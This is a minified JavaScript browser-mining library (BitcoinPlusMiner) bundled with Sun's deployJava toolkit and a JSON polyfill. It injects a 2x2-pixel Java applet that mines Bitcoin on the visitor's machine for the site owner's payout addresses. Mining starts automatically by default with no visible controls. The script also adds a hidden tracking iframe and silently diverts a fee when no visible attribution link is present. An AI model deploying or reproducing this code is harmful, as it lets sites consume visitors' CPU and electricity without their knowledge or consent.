var BitcoinPlusMiner = function(j, p) {
	var b = {
		debug: null,
		firefoxJavaVersion: null,
		myInterval: null,
		preInstallJREList: null,
		returnPage: null,
		brand: null,
		locale: null,
		installType: null,
		EAInstallEnabled: !1,
		EarlyAccessURL: null,
		getJavaURL: "http://java.sun.com/webapps/getjava/BrowserRedirect?host=java.com",
		appleRedirectPage: "http://www.apple.com/support/downloads/",
		oldMimeType: "application/npruntime-scriptable-plugin;DeploymentToolkit",
		mimeType: "application/java-deployment-toolkit",
		launchButtonPNG: "http://java.sun.com/products/jfc/tsc/articles/swing2d/webstart.png",
		browserName: null,
		browserName2: null,
		getJREs: function() {
			var a = [];
			if (b.isPluginInstalled())
				for (var d = b.getPlugin().jvms, e = 0; e < d.getLength(); e++) a[e] = d.get(e).version;
			else if (d = b.getBrowser(), d == "MSIE") b.testUsingActiveX("1.7.0") ? a[0] = "1.7.0" : b.testUsingActiveX("1.6.0") ? a[0] = "1.6.0" : b.testUsingActiveX("1.5.0") ? a[0] = "1.5.0" : b.testUsingActiveX("1.4.2") ? a[0] = "1.4.2" : b.testForMSVM() && (a[0] = "1.1");
			else if (d == "Netscape Family") b.getJPIVersionUsingMimeType(), b.firefoxJavaVersion != null ? a[0] = b.firefoxJavaVersion :
				b.testUsingMimeTypes("1.7") ? a[0] = "1.7.0" : b.testUsingMimeTypes("1.6") ? a[0] = "1.6.0" : b.testUsingMimeTypes("1.5") ? a[0] = "1.5.0" : b.testUsingMimeTypes("1.4.2") ? a[0] = "1.4.2" : b.browserName2 == "Safari" && (b.testUsingPluginsArray("1.7.0") ? a[0] = "1.7.0" : b.testUsingPluginsArray("1.6") ? a[0] = "1.6.0" : b.testUsingPluginsArray("1.5") ? a[0] = "1.5.0" : b.testUsingPluginsArray("1.4.2") && (a[0] = "1.4.2"));
			if (b.debug)
				for (e = 0; e < a.length; ++e) alert("We claim to have detected Java SE " + a[e]);
			return a
		},
		installJRE: function(a) {
			if (b.isPluginInstalled())
				if (b.getPlugin().installJRE(a)) {
					b.refresh();
					if (b.returnPage != null) document.location = b.returnPage;
					return !0
				} else return !1;
				else return b.installLatestJRE()
		},
		installLatestJRE: function() {
			if (b.isPluginInstalled())
				if (b.getPlugin().installLatestJRE()) {
					b.refresh();
					if (b.returnPage != null) document.location = b.returnPage;
					return !0
				} else return !1;
				else {
					b.getBrowser();
					var a = navigator.platform.toLowerCase();
					if (b.EAInstallEnabled == "true" && a.indexOf("win") != -1 && b.EarlyAccessURL != null && (b.preInstallJREList = b.getJREs(), b.returnPage != null)) b.myInterval = setInterval("deployJava.poll()",
						3E3);
					return !1
				}
		},
		runApplet: function(a, d, e) {
			if (e == "undefined" || e == null) e = "1.1";
			var g = e.match("^(\\d+)(?:\\.(\\d+)(?:\\.(\\d+)(?:_(\\d+))?)?)?$");
			if (b.returnPage == null) b.returnPage = document.location;
			if (g != null)
				if (b.getBrowser() != "?" && "Safari" != b.browserName2)
					if (b.versionCheck(e + "+")) b.writeAppletTag(a, d);
					else {
						if (b.installJRE(e + "+")) b.refresh(), location.href = document.location, b.writeAppletTag(a, d)
					} else b.writeAppletTag(a, d);
					else b.debug && alert("Invalid minimumVersion argument to runApplet():" + e)
		},
		writeAppletTag: function(a,
			b) {
			var e = "<applet ",
				g = !1,
				c;
			for (c in a) e += " " + c + '="' + a[c] + '"', c == "code" && (g = !0);
			g || (e += ' code="dummy"');
			e += ">";
			document.write(e);
			if (b != "undefined" && b != null) {
				var g = !1,
					h;
				for (h in b) h == "codebase_lookup" && (g = !0), e = '<param name="' + h + '" value="' + b[h] + '">', document.write(e);
				g || document.write('<param name="codebase_lookup" value="false">')
			}
			document.write("</applet>")
		},
		versionCheck: function(a) {
			var d = 0,
				e = a.match("^(\\d+)(?:\\.(\\d+)(?:\\.(\\d+)(?:_(\\d+))?)?)?(\\*|\\+)?$");
			if (e != null) {
				for (var a = !0, g = [], c = 1; c <
					e.length; ++c) typeof e[c] == "string" && e[c] != "" && (g[d] = e[c], d++);
				g[g.length - 1] == "+" ? (a = !1, g.length--) : g[g.length - 1] == "*" && g.length--;
				d = b.getJREs();
				for (c = 0; c < d.length; ++c)
					if (b.compareVersionToPattern(d[c], g, a)) return !0
			} else alert("Invalid versionPattern passed to versionCheck: " + a);
			return !1
		},
		isWebStartInstalled: function(a) {
			if (b.getBrowser() == "?" || "Safari" == b.browserName2) return !0;
			if (a == "undefined" || a == null) a = "1.4.2";
			var d = !1;
			a.match("^(\\d+)(?:\\.(\\d+)(?:\\.(\\d+)(?:_(\\d+))?)?)?$") != null ? d = b.versionCheck(a +
				"+") : (b.debug && alert("Invalid minimumVersion argument to isWebStartInstalled(): " + a), d = b.versionCheck("1.4.2+"));
			return d
		},
		getJPIVersionUsingMimeType: function() {
			for (var a = 0; a < navigator.mimeTypes.length; ++a) {
				var d = navigator.mimeTypes[a].type.match(/^application\/x-java-applet;jpi-version=(.*)$/);
				if (d != null && (b.firefoxJavaVersion = d[1], "Opera" != b.browserName2)) break
			}
		},
		launchWebStartApplication: function() {
			return !1
		},
		createWebStartLaunchButtonEx: function(a) {
			if (b.returnPage == null) b.returnPage = a;
			document.write('<a href="' +
				("javascript:deployJava.launchWebStartApplication('" + a + "');") + '" onMouseOver="window.status=\'\'; return true;"><img src="' + b.launchButtonPNG + '" border="0" /></a>')
		},
		createWebStartLaunchButton: function(a, d) {
			if (b.returnPage == null) b.returnPage = a;
			document.write('<a href="' + ("javascript:if (!deployJava.isWebStartInstalled(&quot;" + d + "&quot;)) {if (deployJava.installLatestJRE()) {if (deployJava.launch(&quot;" + a + "&quot;)) {}}} else {if (deployJava.launch(&quot;" + a + "&quot;)) {}}") + '" onMouseOver="window.status=\'\'; return true;"><img src="' +
				b.launchButtonPNG + '" border="0" /></a>')
		},
		launch: function(a) {
			document.location = a;
			return !0
		},
		isPluginInstalled: function() {
			var a = b.getPlugin();
			return a && a.jvms ? !0 : !1
		},
		isAutoUpdateEnabled: function() {
			if (b.isPluginInstalled()) return b.getPlugin().isAutoUpdateEnabled();
			return !1
		},
		setAutoUpdateEnabled: function() {
			if (b.isPluginInstalled()) return b.getPlugin().setAutoUpdateEnabled();
			return !1
		},
		setInstallerType: function(a) {
			b.installType = a;
			if (b.isPluginInstalled()) return b.getPlugin().setInstallerType(a);
			return !1
		},
		setAdditionalPackages: function(a) {
			if (b.isPluginInstalled()) return b.getPlugin().setAdditionalPackages(a);
			return !1
		},
		setEarlyAccess: function(a) {
			b.EAInstallEnabled = a
		},
		isPlugin2: function() {
			if (b.isPluginInstalled() && b.versionCheck("1.6.0_10+")) try {
				return b.getPlugin().isPlugin2()
			} catch (a) {}
			return !1
		},
		allowPlugin: function() {
			b.getBrowser();
			return "Safari" != b.browserName2 && "Opera" != b.browserName2
		},
		getPlugin: function() {
			b.refresh();
			var a = null;
			b.allowPlugin() && (a = document.getElementById("deployJavaPlugin"));
			return a
		},
		compareVersionToPattern: function(a, b, e) {
			var g = a.match("^(\\d+)(?:\\.(\\d+)(?:\\.(\\d+)(?:_(\\d+))?)?)?$");
			if (g != null) {
				for (var c = 0, a = [], h = 1; h < g.length; ++h) typeof g[h] == "string" && g[h] != "" && (a[c] = g[h], c++);
				g = Math.min(a.length, b.length);
				if (e)
					for (h = 0; h < g; ++h) {
						if (a[h] != b[h]) return !1
					} else
						for (h = 0; h < g; ++h)
							if (a[h] < b[h]) return !1;
							else
				if (a[h] > b[h]) break;
				return !0
			} else return !1
		},
		getBrowser: function() {
			if (b.browserName == null) {
				var a = navigator.userAgent.toLowerCase();
				b.debug && alert("userAgent -> " + a);
				a.indexOf("msie") != -1 ? (b.browserName = "MSIE", b.browserName2 = "MSIE") : a.indexOf("firefox") != -1 ? (b.browserName = "Netscape Family", b.browserName2 = "Firefox") : a.indexOf("chrome") != -1 ? (b.browserName = "Netscape Family", b.browserName2 = "Chrome") : a.indexOf("safari") != -1 ? (b.browserName = "Netscape Family", b.browserName2 = "Safari") : a.indexOf("mozilla") != -1 ? (b.browserName = "Netscape Family", b.browserName2 = "Other") : a.indexOf("opera") != -1 ? (b.browserName = "Netscape Family", b.browserName2 = "Opera") : (b.browserName = "?", b.browserName2 = "unknown");
				b.debug && alert("Detected browser name:" + b.browserName + ", " + b.browserName2)
			}
			return b.browserName
		},
		testUsingActiveX: function(a) {
			a = "JavaWebStart.isInstalled." + a + ".0";
			if (!ActiveXObject) return b.debug && alert("Browser claims to be IE, but no ActiveXObject object?"), !1;
			try {
				return new ActiveXObject(a) != null
			} catch (d) {
				return !1
			}
		},
		testForMSVM: function() {
			if (typeof oClientCaps != "undefined") {
				var a = oClientCaps.getComponentVersion("{08B0E5C0-4FCB-11CF-AAA5-00401C608500}", "ComponentID");
				return a == "" || a == "5,0,5000,0" ? !1 : !0
			} else return !1
		},
		testUsingMimeTypes: function(a) {
			if (!navigator.mimeTypes) return b.debug && alert("Browser claims to be Netscape family, but no mimeTypes[] array?"), !1;
			for (var d = 0; d < navigator.mimeTypes.length; ++d) {
				s = navigator.mimeTypes[d].type;
				var e = s.match(/^application\/x-java-applet\x3Bversion=(1\.8|1\.7|1\.6|1\.5|1\.4\.2)$/);
				if (e != null && b.compareVersions(e[1], a)) return !0
			}
			return !1
		},
		testUsingPluginsArray: function(a) {
			if (!navigator.plugins || !navigator.plugins.length) return !1;
			for (var d = navigator.platform.toLowerCase(),
					e = 0; e < navigator.plugins.length; ++e)
				if (s = navigator.plugins[e].description, s.search(/^Java Switchable Plug-in (Cocoa)/) != -1) {
					if (b.compareVersions("1.5.0", a)) return !0
				} else
			if (s.search(/^Java/) != -1 && d.indexOf("win") != -1 && (b.compareVersions("1.5.0", a) || b.compareVersions("1.6.0", a))) return !0;
			if (b.compareVersions("1.5.0", a)) return !0;
			return !1
		},
		IEInstall: function() {
			return !1
		},
		done: function() {},
		FFInstall: function() {
			return !1
		},
		compareVersions: function(a, b) {
			for (var e = a.split("."), c = b.split("."), f = 0; f < e.length; ++f) e[f] =
				Number(e[f]);
			for (f = 0; f < c.length; ++f) c[f] = Number(c[f]);
			e.length == 2 && (e[2] = 0);
			if (e[0] > c[0]) return !0;
			if (e[0] < c[0]) return !1;
			if (e[1] > c[1]) return !0;
			if (e[1] < c[1]) return !1;
			if (e[2] > c[2]) return !0;
			if (e[2] < c[2]) return !1;
			return !0
		},
		enableAlerts: function() {
			b.browserName = null;
			b.debug = !0
		},
		poll: function() {
			b.refresh();
			var a = b.getJREs();
			if (b.preInstallJREList.length == 0 && a.length != 0 && (clearInterval(b.myInterval), b.returnPage != null)) location.href = b.returnPage;
			if (b.preInstallJREList.length != 0 && a.length != 0 && b.preInstallJREList[0] !=
				a[0] && (clearInterval(b.myInterval), b.returnPage != null)) location.href = b.returnPage
		},
		writePluginTag: function() {
			var a = b.getBrowser();
			a == "MSIE" ? document.write('<object classid="clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA" id="deployJavaPlugin" width="0" height="0"></object>') : a == "Netscape Family" && b.allowPlugin() && b.writeEmbedTag()
		},
		refresh: function() {
			navigator.plugins.refresh(!1);
			b.getBrowser() == "Netscape Family" && b.allowPlugin() && document.getElementById("deployJavaPlugin") == null && b.writeEmbedTag()
		},
		writeEmbedTag: function() {
			var a = !1;
			if (navigator.mimeTypes != null) {
				for (var d = 0; d < navigator.mimeTypes.length; d++) navigator.mimeTypes[d].type == b.mimeType && navigator.mimeTypes[d].enabledPlugin && (document.write('<embed id="deployJavaPlugin" type="' + b.mimeType + '" hidden="true" />'), a = !0);
				if (!a)
					for (d = 0; d < navigator.mimeTypes.length; d++) navigator.mimeTypes[d].type == b.oldMimeType && navigator.mimeTypes[d].enabledPlugin && document.write('<embed id="deployJavaPlugin" type="' + b.oldMimeType + '" hidden="true" />')
			}
		},
		do_initialize: function() {
			b.writePluginTag();
			if (b.locale == null) {
				var a = null;
				if (a == null) try {
					a = navigator.userLanguage
				} catch (d) {}
				if (a == null) try {
					a = navigator.systemLanguage
				} catch (e) {}
				if (a == null) try {
					a = navigator.language
				} catch (c) {}
				if (a != null) a.replace("-", "_"), b.locale = a
			}
		}
	};
	b.do_initialize();
	var w = {
		_keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_ ",
		encode: function(a) {
			for (var b = "", e, c, f, h, n, A, i = 0, a = w._utf8_encode(a); i < a.length;) e = a.charCodeAt(i++), c = a.charCodeAt(i++), f = a.charCodeAt(i++),
			h = e >> 2, e = (e & 3) << 4 | c >> 4, n = (c & 15) << 2 | f >> 6, A = f & 63, isNaN(c) ? n = A = 64 : isNaN(f) && (A = 64), b = b + this._keyStr.charAt(h) + this._keyStr.charAt(e) + this._keyStr.charAt(n) + this._keyStr.charAt(A);
			return b.replace(/\s*$/, "")
		},
		decode: function(a) {
			for (var b = "", c, g, f, h, n, i = 0, a = a.replace(/[^A-Za-z0-9\+\/\=]/g, ""); i < a.length;) c = this._keyStr.indexOf(a.charAt(i++)), g = this._keyStr.indexOf(a.charAt(i++)), h = this._keyStr.indexOf(a.charAt(i++)), n = this._keyStr.indexOf(a.charAt(i++)), c = c << 2 | g >> 4, g = (g & 15) << 4 | h >> 2, f = (h & 3) << 6 | n, b += String.fromCharCode(c),
			h != 64 && (b += String.fromCharCode(g)), n != 64 && (b += String.fromCharCode(f));
			return b = w._utf8_decode(b)
		},
		_utf8_encode: function(a) {
			for (var a = a.replace(/\r\n/g, "\n"), b = "", c = 0; c < a.length; c++) {
				var g = a.charCodeAt(c);
				g < 128 ? b += String.fromCharCode(g) : (g > 127 && g < 2048 ? b += String.fromCharCode(g >> 6 | 192) : (b += String.fromCharCode(g >> 12 | 224), b += String.fromCharCode(g >> 6 & 63 | 128)), b += String.fromCharCode(g & 63 | 128))
			}
			return b
		},
		_utf8_decode: function(a) {
			for (var b = "", c = 0, g = c1 = c2 = 0; c < a.length;) g = a.charCodeAt(c), g < 128 ? (b += String.fromCharCode(g),
				c++) : g > 191 && g < 224 ? (c2 = a.charCodeAt(c + 1), b += String.fromCharCode((g & 31) << 6 | c2 & 63), c += 2) : (c2 = a.charCodeAt(c + 1), c3 = a.charCodeAt(c + 2), b += String.fromCharCode((g & 15) << 12 | (c2 & 63) << 6 | c3 & 63), c += 3);
			return b
		}
	}, l, c = {
			autostart: !0,
			init: function() {},
			payout: function() {},
			error: function() {},
			start: function() {},
			stop: function() {},
			addControls: !1,
			api: "b",
			difficulty: 32,
			info: ""
		};
	c.appletJarURL = (window.location.protocol == "https:" ? "https:" : "http:") + "//www.bitcoinplus.com/jar/bitcoinplus-miner.jar";
	c.serverURL = "http://www.bitcoinplus.com";
	var v = !1,
		x = "",
		t = !1,
		n, y = ("" + Math.random()).replace(/\D/g, ""),
		i = 0,
		o = function() {
			return "z" + y + "_" + (new Date).getTime() + "_" + i++
		}, k = function() {
			return v ? l.c() : 0
		}, q = function() {
			return Math.round(k() / 1E3)
		}, H = function() {
			v = !0;
			x !== "" && (l.i("" + x), x = void 0);
			setTimeout(function() {
				c.init();
				c.autostart && c.start()
			}, 20)
		}, m = 0,
		f = 0,
		I = function(a) {
			var b = JSON.parse(a);
			m++;
			b.coins = b.payoutInCoins;
			f += b.payoutInCoins;
			setTimeout(function() {
				c.payout(b)
			}, 20)
		}, E = function(a) {
			a.indexOf("http:") == 0 && window.location.protocol == "https:" &&
				(a = "https:" + a.substr(5, a.length));
			return a
		}, B = [6E4, 12E4, 3E5],
		D = !1,
		C = 0,
		F = function(a) {
			a = E(a);
			jQuery.ajax({
				url: a + "&callback=?",
				dataType: "jsonp",
				timeout: 15E3,
				success: function(a) {
					D = !1;
					l.g("" + JSON.stringify(a));
					C = 0
				},
				error: function() {
					setTimeout(function() {
						F(a)
					}, C >= B.length ? B[B.length - 1] : B[C]);
					C++
				}
			})
		}, J = function(a) {
			a = E(a);
			jQuery.ajax({
				url: a + "&callback=?",
				dataType: "jsonp",
				timeout: 15E3,
				success: function(a) {
					l.h("" + JSON.stringify(a))
				}
			})
		}, r = 0,
		z = {
			autostart: !0
		};
	if (p !== void 0 && p !== null) {
		if (p.toVisitor !== void 0 && p.toVisitor !==
			null) r = p.toVisitor, r > 100 ? r = 100 : r < 0 && (r = 0), r = Math.round(1E4 * (r / 100));
		if (p.addControls === !0) z.addControls = !0;
		if (p.autostart === !1) z.autostart = !1
	}
	if (typeof j === "string" || typeof j === "number")
		if (r === 0) z.payoutTargets = [{
			to: j,
			amount: 1E4
		}];
		else {
			var G = 1E4 - r;
			z.payoutTargets = G > 0 ? [{
				to: j,
				amount: G
			}, {
				to: "visitor",
				amount: r
			}] : [{
				to: "visitor",
				amount: 1E4
			}]
		} else z = j;
	var u = {
		start: function(a) {
			if (typeof a === "function") {
				var b = c.start;
				c.start = function() {
					b();
					a()
				}
			} else l.a(), c.start();
			return u
		},
		stop: function(a) {
			if (typeof a ===
				"function") {
				var b = c.stop;
				c.stop = function() {
					b();
					a()
				}
			} else v && (l.b(), c.stop());
			return u
		},
		hashesPerSecond: k,
		kiloHashesPerSecond: q,
		hps: k,
		khps: q,
		payouts: function() {
			return m
		},
		paid: function() {
			return f
		},
		averageSecondsPerPayout: function(a) {
			var b = 0,
				b = a === void 0 ? k() : a;
			return 4294967296 / b
		},
		foundBitcoinPlusLink: function() {
			return n
		},
		init: function(a) {
			c.init = a;
			return u
		},
		payout: function(a) {
			c.payout = a;
			return u
		},
		error: function(a) {
			c.error = a;
			return u
		},
		deployJava: b
	};
	(function(a) {
		for (var d in a) c[d] = a[d];
		for (var e = "", g =
				0, f, h = a = 0; h < c.payoutTargets.length; h++) {
			d = "" + c.payoutTargets[h].to;
			var i = c.payoutTargets[h].amount;
			if (d.indexOf("@") != -1) e += ".e" + w.encode(d);
			else if (/^\d+$/.test(d)) e += ".u" + d;
			else if (d.toUpperCase() == "USER" || d.toUpperCase() == "VISITOR") {
				t = !0;
				g = i;
				continue
			} else if (d.length == 42 && /^[a-zA-Z0-9]+$/.test(d)) f = d, e += ".m" + f;
			else continue;
			e += "." + i;
			a += i
		}
		d = document.getElementsByTagName("script");
		d = d[d.length - 1];
		h = jQuery(d).prev("a").filter('[href^="http://www.bitcoinplus.com"]');
		h.size() == 1 && h.is(":visible") ? n = !0 : (n = !1, e += ".e" + w.encode("nolinkfee@bitcoinplus.com"), e += "." + Math.round(4 / 85 * a));
		if (c.addControls) {
			var a = h.size() == 1 ? h : jQuery(d),
				k = jQuery;
			d = k("<div><strong>Bitcoin Plus Miner</strong></div>");
			var m = k('<a href="#" style="display:inline">Start</a>'),
				y = k('<span style="display:inline">Start</span>');
			c.autostart ? m.hide() : y.hide();
			var q = k('<span style="display:inline"> | </span>'),
				j = k('<a href="#" style="display:inline">Stop</a>');
			j.hide();
			var p = k('<span style="display:inline">Stop</span>');
			u.start(function() {
				m.hide();
				y.css("display", "inline");
				p.hide();
				j.css("display", "inline")
			});
			u.stop(function() {
				j.hide();
				p.css("display", "inline");
				y.hide();
				m.css("display", "inline")
			});
			m.click(function(a) {
				u.start();
				a.preventDefault()
			});
			j.click(function(a) {
				u.stop();
				a.preventDefault()
			});
			var h = k("<span>Speed: </span>"),
				r = k("<span>0</span>");
			setInterval(function() {
				r.html(u.khps() * 1E3)
			}, 1E3);
			i = k("<div>");
			i.append(m).append(y).append(q).append(j).append(p);
			k = k("<div>");
			k.append(h).append(r);
			d.append(i).append(k);
			a.before(d)
		}
		c.difficulty =
			32;
		if (c.api == "a")
			if (c.payoutTargets.length > 1) c.api = "b";
			else
		if (f === void 0 || f === null) c.api = "b";
		t && jQuery.ajax({
			url: c.serverURL + "/api/user/info?callback=?",
			dataType: "jsonp",
			timeout: 15E3,
			success: function(a) {
				typeof a.userMiningToken === "string" && (a = e + ".m" + a.userMiningToken + "." + g, v ? l.i("" + x) : x = a)
			}
		});
		f = {
			id: "btcminer",
			mayscript: !0,
			code: "com.bitcoinplus.applet.MiningApplet",
			archive: c.appletJarURL,
			width: 2,
			height: 2
		};
		a = {};
		a.b = e;
		a.a = c.autostart;
		a.c = c.serverURL;
		a.d = c.difficulty;
		a.e = o();
		a.f = o();
		a.g = o();
		a.h = o();
		a.i = c.api;
		a.initial_focus = !1;
		d = "";
		c.info !== void 0 && c.info !== null && /^[0-9a-zA-Z-_.]{1,65}$/.test(c.info) && (d = "h=" + c.info);
		a.j = d;
		window[a.e] = function() {
			H()
		};
		window[a.f] = function(a) {
			D || (D = !0, F(a))
		};
		window[a.g] = function(a) {
			J(a)
		};
		window[a.h] = function(a) {
			I(a)
		};
		b.getJREs().length == 0 && c.error({
			code: 1,
			message: "You need to install Java"
		});
		b.runApplet(f, a, "1.5");
		l = document.getElementById("btcminer")
	})(z);
	if ("http:" == document.location.protocol) q = document.createElement("iframe"), q.style.display = "none", q.src = "http://www.bitcoinplus.com/tracking/thirdpartyminer",
	document.body.appendChild(q);
	return u
}, JSON;
JSON || (JSON = {});
(function() {
	function j(b) {
		return b < 10 ? "0" + b : b
	}

	function p(b) {
		l.lastIndex = 0;
		return l.test(b) ? '"' + b.replace(l, function(b) {
			var c = x[b];
			return typeof c === "string" ? c : "\\u" + ("0000" + b.charCodeAt(0).toString(16)).slice(-4)
		}) + '"' : '"' + b + '"'
	}

	function b(n, j) {
		var i, o, k, q, l = c,
			m, f = j[n];
		f && typeof f === "object" && typeof f.toJSON === "function" && (f = f.toJSON(n));
		typeof t === "function" && (f = t.call(j, n, f));
		switch (typeof f) {
			case "string":
				return p(f);
			case "number":
				return isFinite(f) ? String(f) : "null";
			case "boolean":
			case "null":
				return String(f);
			case "object":
				if (!f) return "null";
				c += v;
				m = [];
				if (Object.prototype.toString.apply(f) === "[object Array]") {
					q = f.length;
					for (i = 0; i < q; i += 1) m[i] = b(i, f) || "null";
					k = m.length === 0 ? "[]" : c ? "[\n" + c + m.join(",\n" + c) + "\n" + l + "]" : "[" + m.join(",") + "]";
					c = l;
					return k
				}
				if (t && typeof t === "object") {
					q = t.length;
					for (i = 0; i < q; i += 1) typeof t[i] === "string" && (o = t[i], (k = b(o, f)) && m.push(p(o) + (c ? ": " : ":") + k))
				} else
					for (o in f) Object.prototype.hasOwnProperty.call(f, o) && (k = b(o, f)) && m.push(p(o) + (c ? ": " : ":") + k);
				k = m.length === 0 ? "{}" : c ? "{\n" + c + m.join(",\n" +
					c) + "\n" + l + "}" : "{" + m.join(",") + "}";
				c = l;
				return k
		}
	}
	if (typeof Date.prototype.toJSON !== "function") Date.prototype.toJSON = function() {
		return isFinite(this.valueOf()) ? this.getUTCFullYear() + "-" + j(this.getUTCMonth() + 1) + "-" + j(this.getUTCDate()) + "T" + j(this.getUTCHours()) + ":" + j(this.getUTCMinutes()) + ":" + j(this.getUTCSeconds()) + "Z" : null
	}, String.prototype.toJSON = Number.prototype.toJSON = Boolean.prototype.toJSON = function() {
		return this.valueOf()
	};
	var w = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
		l = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
		c, v, x = {
			"\u0008": "\\b",
			"\t": "\\t",
			"\n": "\\n",
			"\u000c": "\\f",
			"\r": "\\r",
			'"': '\\"',
			"\\": "\\\\"
		}, t;
	if (typeof JSON.stringify !== "function") JSON.stringify = function(n, j, i) {
		var o;
		v = c = "";
		if (typeof i === "number")
			for (o = 0; o < i; o += 1) v += " ";
		else typeof i === "string" && (v = i); if ((t = j) && typeof j !== "function" && (typeof j !== "object" || typeof j.length !== "number")) throw Error("JSON.stringify");
		return b("", {
			"": n
		})
	};
	if (typeof JSON.parse !== "function") JSON.parse = function(b, c) {
		function i(b, j) {
			var l, m, f = b[j];
			if (f && typeof f === "object")
				for (l in f) Object.prototype.hasOwnProperty.call(f, l) && (m = i(f, l), m !== void 0 ? f[l] = m : delete f[l]);
			return c.call(b, j, f)
		}
		var j, b = String(b);
		w.lastIndex = 0;
		w.test(b) && (b = b.replace(w, function(b) {
			return "\\u" + ("0000" + b.charCodeAt(0).toString(16)).slice(-4)
		}));
		if (/^[\],:{}\s]*$/.test(b.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, "@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,
			"]").replace(/(?:^|:|,)(?:\s*\[)+/g, ""))) return j = eval("(" + b + ")"), typeof c === "function" ? i({
			"": j
		}, "") : j;
		throw new SyntaxError("JSON.parse");
	}
})();